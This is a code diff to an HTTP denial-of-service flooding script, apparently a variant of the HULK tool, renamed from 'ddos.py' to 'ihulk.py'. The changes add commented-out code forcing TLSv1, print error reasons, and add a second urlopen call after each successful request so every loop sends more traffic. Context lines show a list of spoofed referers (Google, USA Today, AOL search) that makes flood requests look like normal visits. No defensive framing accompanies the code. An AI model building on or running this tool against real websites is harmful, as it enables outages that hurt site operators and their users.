@@ -16,6 +16,8 @@ import sys
 import threading
 from random import randint, choice
 import re
+# import ssl
+# from functools import wraps
 
 # global params
 url = host = ''
@@ -43,6 +45,17 @@ referes.append('https://www.google.com/?q=')
 referes.append('http://www.usatoday.com/search/results?q=')
 referes.append('http://engadget.search.aol.com/search?q=')
 referes.append('http://' + host + '/')
+
+
+# def sslwrap(func):
+#     @wraps(func)
+#     def bar(*args, **kw):
+#         kw['ssl_version'] = ssl.PROTOCOL_TLSv1
+#         return func(*args, **kw)
+#     return bar
+
+
+# ssl.wrap_socket = sslwrap(ssl.wrap_socket)
 
 
 def inc_counter():
@@ -73,7 +86,7 @@ def buildblock(size):
 
 def usage():
     print ('---------------------------------------------------')
-    print ('USAGE: python ddos.py <url>')
+    print ('USAGE: python ihulk.py <url>')
     print ('you can add "safe" after url, to autoshut after dos')
     print ('---------------------------------------------------')
 
@@ -98,11 +111,15 @@ def httpcall(url):
         inc_counter()
     except HTTPError as e:
         set_flag(1)
+        print(e.reason)
         print('Response code 500')
         response_code = 500
     except URLError as e:
         print(e.reason)
         sys.exit()
+    else:
+        urlopen(request)
+        inc_counter()
 
     return(response_code)
 
